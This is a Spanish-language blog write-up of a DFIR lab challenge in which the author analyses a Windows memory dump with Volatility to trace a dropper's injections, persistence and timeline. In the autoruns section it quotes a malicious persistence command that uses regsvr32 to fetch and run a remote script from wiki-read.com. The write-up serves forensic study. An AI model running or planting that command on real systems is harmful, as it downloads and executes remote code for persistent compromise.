---
title: Reto DFIR 2 - Atenea CCN
date: 2025-01-15 19:12:49 +0100
categories: [Laboratorios, DFIR]
tags: [dfir, forensics, malware analysis, memory analysis, volatility]
---

## Recursos

[Enlace del fichero usado (Google Drive)](https://drive.google.com/file/d/1OgjS9MtPklkL-jeiZcoj9SLAs8mFcl41/view?usp=sharing)

## Contexto

### Información

Sospechamos que el volcado de memoria adjunto se corresponde con una máquina que ha
sido infectada de forma persistente por algún tipo de malware, posiblemente un dropper.
Nos gustaría identificar el dominio dañino utilizado por el mismo.

## Análisis de procesos

![Listado de procesos](/assets/img/posts/atenea_dfir_2/20250115_191249_2025-01-15_20-12.png)
_Aquí podemos ver algunos procesos interesantes y algunas anomalías que iremos viendo más adelante_

### Identificando posibles inyecciones en los comandos

En volatility disponemos de un módulo para intentar detectar inyecciónes o comportamientos anómalos en los procesos de windows.

![Análisis de anomalías](/assets/img/posts/atenea_dfir_2/20250115_192639_Peek_2025-01-15_20-26.gif)
_Podemos ver que encuentra posibles anomalías en los dos prodesos de Internet Explorer y en csrss_

### Análisis

En el proceso csrss.exe (PID 592):

-> Tiene una región de memoria con permisos PAGE_EXECUTE_READWRITE (que es sospechoso para csrss.exe)

-> Contiene código ensamblador que parece shellcode, con instrucciones como OUT y STD que son inusuales en código legítimo

En dos procesos de IEXPLORE.EXE (PIDs 1624 y 3728):

-> Ambos tienen regiones idénticas en la dirección 0x5fff0000
-> También con permisos PAGE_EXECUTE_READWRITE
-> Contienen la firma "dtrR" seguida de un patrón de bytes similar
-> El código ensamblador incluye un CALL FAR que podría ser usado para ejecución de código malicioso

## Análisis de autoruns

### Plugin autorun

[Github](https://github.com/Telindus-CSIRT/volatility3-autoruns/blob/main/autorun.py)

Una vez importado este plugin nos permite ver que ejecutables están configurados para ejecutarse al inicio del sistema lo que es normal en la forma de generar persistencia en un malware.

![Análisis de autoruns](/assets/img/posts/atenea_dfir_2/20250115_193253_2025-01-15_20-32.png

### Análisis

La entrada más sospechosa es 

regsvr32 /u /s /i:http://wiki-read.com/info.txt scrobj.dll

Este comando en el autoruns es muy sospechoso porque:

-> Usa regsvr32 para desregistrar (/u) scrobj.dll
-> Intenta cargar un script desde una URL externa (http://wiki-read.com/info.txt)
-> Se ejecuta silenciosamente (/s)
-> Está configurado para ejecutarse automáticamente al inicio del sistema

![Análisis adicional de autoruns](/assets/img/posts/atenea_dfir_2/20250115_193539_2025-01-15_20-35.png)

regsvr32 /s /n /i:U shell32

Este comando aparece dos veces como "_nltide_2" en RunOnce para diferentes usuarios.

Hasta ahora el posible vector inicial de infección parece ser la descarga y ejecución del script malicioso desde wiki-read.com mediante regsvr32, que es una técnica conocida de "Living off the Land" para evadir defensas.

### Correlación

Esto encaja con el hallazgo anterior:

-> El script malicioso probablemente fue descargado a través de Internet Explorer

-> Inyectó código en csrss.exe (un proceso crítico del sistema)

-> Los dos procesos de IE con la misma firma indican que el malware se replicó

## Relación con los procesos

![Árbol de procesos](/assets/img/posts/atenea_dfir_2/20250115_194308_2025-01-15_20-43.png)

### Relación

Los procesos de Internet Explorer sospechosos (PIDs 1624 y 3728) son hijos de explorer.exe (PID 1868)

-> Esto es normal ya que IE se suele lanzar desde el explorador
-> Pero recordemos que ambos tienen la misma región de memoria maliciosa

Hay varios shells de cmd.exe abiertos (PIDs 3468, 300, 1080) también como hijos de explorer.exe

-> Esto podría indicar actividad de comando y control
-> Especialmente sospechoso tener múltiples shells abiertos

Hay dos instancias de explorer.exe (PIDs 1868 y 1608)

-> Una es hija de winlogon.exe (normal)
-> La otra (PID 1608) parece huérfana (su padre PID 1552 no existe)
-> Esta segunda instancia podría ser una persistencia del malware

El proceso regedit.exe (PID 2664) podría indicar modificaciones al registro

-> Esto coincide con las entradas de autoruns que encontramos antes

### Línea temporal

La línea temporal sugiere:

- 23:47: Se inicia el primer IE sospechoso (PID 1624)
- 23:49: Se modifican las entradas de autoruns (según el output anterior)
- 23:52: Se inicia el segundo IE sospechoso (PID 3728)

## Análisis de conexiónes

![Análisis de conexiones](/assets/img/posts/atenea_dfir_2/20250115_195117_2025-01-15_20-50.png)

### Análisis

Los procesos de IE sospechosos tienen actividad de red:

-> PID 1624 usando UDP puerto 1031 en 127.0.0.1
-> PID 3728 usando UDP puerto 1035 en 127.0.0.1
-> Ambos procesos usan conexiones UDP locales, lo que es inusual para IE

Cronología interesante:

-> 23:47:13: Primera conexión del IE sospechoso (PID 1624)
-> 23:52:15: Segunda conexión del IE sospechoso (PID 3728)
-> Coincide con la timeline que vimos en el pstree

La comunicación UDP en localhost entre los procesos de IE es especialmente sospechosa y podría indicar:

- Comunicación entre componentes del malware
- Túnel C2 (Command & Control)
- Evasión de firewalls

## Análisis de URLs en memoria

### Datos del proceso 1624

Dado el timeline que hemos visto:

-> PID 1624 (primer IE) se inició a las 23:47:12
-> Las modificaciones del registro ocurrieron a las 23:49
-> PID 3728 (segundo IE) se inició después a las 23:52:15

El PID 1624 parece ser la infección inicial que desencadenó todo, así que es el mejor candidato para buscar la URL maliciosa.

![Volcado de memoria del proceso](/assets/img/posts/atenea_dfir_2/20250115_195422_2025-01-15_20-54.png)
_Lo volcamos en un txt por si es mucho contenido_

![Análisis de URLs en memoria](/assets/img/posts/atenea_dfir_2/20250115_200501_2025-01-15_21-04.png)